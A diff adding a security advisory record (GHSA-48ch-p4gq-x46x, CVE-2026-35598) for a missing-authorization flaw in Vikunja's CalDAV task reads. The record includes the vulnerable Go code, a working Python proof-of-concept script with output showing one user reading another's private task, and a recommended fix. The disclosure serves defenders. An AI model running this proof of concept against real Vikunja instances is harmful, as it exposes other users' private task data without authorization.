@@ -1,0 +1,62 @@
+{
+  "id": "GHSA-48ch-p4gq-x46x",
+  "modified": "2026-04-10T19:48:59.889416Z",
+  "published": "2026-04-10T15:34:23Z",
+  "aliases": [
+    "CVE-2026-35598"
+  ],
+  "summary": "Vikunja Missing Authorization on CalDAV Task Read",
+  "details": "## Summary\n\nThe CalDAV `GetResource` and `GetResourcesByList` methods fetch tasks by UID from the database without verifying that the authenticated user has access to the task's project. Any authenticated CalDAV user who knows (or guesses) a task UID can read the full task data from any project on the instance.\n\n## Details\n\n`GetTasksByUIDs` at `pkg/models/tasks.go:376-393` performs a global database query with no authorization check:\n\n```go\nfunc GetTasksByUIDs(s *xorm.Session, uids []string, a web.Auth) (tasks []*Task, err error) {\n    tasks = []*Task{}\n    err = s.In(\"uid\", uids).Find(\u0026tasks)\n    // ...\n}\n```\n\nThe `web.Auth` parameter is accepted but never used for permission filtering. This function is called by:\n- `GetResource` at `pkg/routes/caldav/listStorageProvider.go:266` (CalDAV GET)\n- `GetResourcesByList` at `pkg/routes/caldav/listStorageProvider.go:199` (CalDAV REPORT multiget)\n\nAll other CalDAV operations enforce authorization: `CreateResource` checks `CanCreate()`, `UpdateResource` checks `CanUpdate()`, `DeleteResource` checks `CanDelete()`. Only the read operations skip authorization.\n\nThe project ID in the CalDAV URL is ignored. A request to `/dav/projects/{attacker_project}/{victim_task_uid}.ics` returns the victim's task regardless of which project ID is in the path.\n\n## Proof of Concept\n\nTested on Vikunja v2.2.2.\n\n```python\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\nTARGET = \"http://localhost:3456\"\nAPI = f\"{TARGET}/api/v1\"\n\ndef login(u, p):\n    return requests.post(f\"{API}/login\", json={\"username\": u, \"password\": p}).json()[\"token\"]\n\ndef h(token):\n    return {\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"}\n\nalice_token = login(\"alice\", \"Alice1234!\")\nbob_token = login(\"bob\", \"Bob12345!\")\n\n# alice creates private project and task\nproj = requests.put(f\"{API}/projects\", headers=h(alice_token),\n                    json={\"title\": \"Private\"}).json()\ntask = requests.put(f\"{API}/projects/{proj['id']}/tasks\", headers=h(alice_token),\n                    json={\"title\": \"Secret CEO salary 500k\"}).json()\n\n# task UID must be set (normally done by CalDAV sync; here via sqlite for PoC)\n# sqlite3 vikunja.db \"UPDATE tasks SET uid='test-uid-001' WHERE id={task['id']};\"\nTASK_UID = \"test-uid-001\"\n\n# bob tries REST API\nr = requests.get(f\"{API}/tasks/{task['id']}\", headers=h(bob_token))\nprint(f\"REST API: {r.status_code}\")  # 403\n\n# bob gets CalDAV token\ncaldav_token = requests.put(f\"{API}/user/settings/token/caldav\",\n    headers=h(bob_token)).json()[\"token\"]\n\n# bob reads alice's task via CalDAV (project ID in URL doesn't matter)\nr = requests.get(f\"{TARGET}/dav/projects/{proj['id']}/{TASK_UID}.ics\",\n                 auth=HTTPBasicAuth(\"bob\", caldav_token))\nprint(f\"CalDAV: {r.status_code}\")  # 200\nprint(r.text)  # contains SUMMARY:Secret CEO salary 500k\n```\n\nOutput:\n```\nREST API: 403\nCalDAV: 200\nBEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VTODO\nUID:test-uid-001\nSUMMARY:Secret CEO salary 500k\nDUE:20260401T000000Z\nEND:VTODO\nEND:VCALENDAR\n```\n\nThe REST API correctly returns 403, but CalDAV leaks the full task. The project ID in the CalDAV URL is ignored - bob can also use his own project ID and still get alice's task.\n\n## Impact\n\nAn authenticated CalDAV user who obtains a task UID (from shared calendar URLs, client sync logs, or enumeration) can read the full task details from any project in the instance, regardless of their access rights. This includes titles, descriptions, due dates, priority, labels, and reminders. In multi-tenant deployments, this exposes data across organizational boundaries.\n\nTask UIDs are UUIDv4 and not trivially enumerable, but they are exposed in CalDAV resource paths, client synchronization logs, and shared calendar contexts.\n\n## Recommended Fix\n\nAdd a `CanRead` permission check on each returned task's project in both `GetResource` and `GetResourcesByList`:\n\n```go\ntasks, err := models.GetTasksByUIDs(s, []string{vcls.task.UID}, vcls.user)\n// ...\nfor _, t := range tasks {\n    project := \u0026models.Project{ID: t.ProjectID}\n    can, _, err := project.CanRead(s, vcls.user)\n    if err != nil || !can {\n        return nil, false, errs.ForbiddenError\n    }\n}\n```\n\n---\n*Found and reported by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.3.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.2.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-48ch-p4gq-x46x/GHSA-48ch-p4gq-x46x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-48ch-p4gq-x46x"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35598"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/pull/2579"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/879462d717351fe5d276ddec5246bdec31b41661"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0"
+    }
+  ]
+}
